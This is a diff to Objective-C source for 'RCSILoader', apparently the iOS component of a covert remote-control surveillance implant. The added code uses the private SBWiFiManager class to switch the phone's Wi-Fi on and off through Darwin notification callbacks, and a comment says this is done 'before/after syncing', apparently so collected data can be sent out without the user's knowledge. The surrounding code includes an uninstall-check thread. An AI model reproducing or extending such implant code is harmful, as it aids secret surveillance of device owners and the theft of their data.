@@ -142,6 +142,28 @@ void RILog (NSString *format, ...)
   [string release];
 }
 
+static void TurnWifiOn(CFNotificationCenterRef center, 
+                       void *observer,
+                       CFStringRef name, 
+                       const void *object,
+                       CFDictionaryRef userInfo) 
+{ 
+  Class wifiManager = objc_getClass("SBWiFiManager");
+  id antani = [wifiManager performSelector: @selector(sharedInstance)];
+  [antani setWiFiEnabled: YES];
+}
+
+static void TurnWifiOff(CFNotificationCenterRef center, 
+                        void *observer,
+                        CFStringRef name, 
+                        const void *object,
+                        CFDictionaryRef userInfo) 
+{ 
+  Class wifiManager = objc_getClass("SBWiFiManager");
+  id antani = [wifiManager performSelector: @selector(sharedInstance)];
+  [antani setWiFiEnabled: NO];
+}
+
 @implementation RCSILoader
 
 // For stanby Event
@@ -883,6 +905,22 @@ BOOL triggerStanByAction(UInt32 aAction)
       [NSThread detachNewThreadSelector: @selector(checkForUninstall)
                                toTarget: self
                              withObject: nil];
+
+      // Install a callback in order to be able to force wifi on and off
+      // before/after syncing
+      CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
+                                      NULL,
+                                      &TurnWifiOn,
+                                      CFSTR("com.apple.Preferences.WiFiOn"),
+                                      NULL, 
+                                      CFNotificationSuspensionBehaviorCoalesce); 
+
+      CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(),
+                                      NULL,
+                                      &TurnWifiOff,
+                                      CFSTR("com.apple.Preferences.WiFiOff"),
+                                      NULL, 
+                                      CFNotificationSuspensionBehaviorCoalesce); 
     }
   else 
     {
@@ -908,7 +946,6 @@ BOOL triggerStanByAction(UInt32 aAction)
 }
 
 @end
-
 
 extern "C" void RCSIInit ()
 {
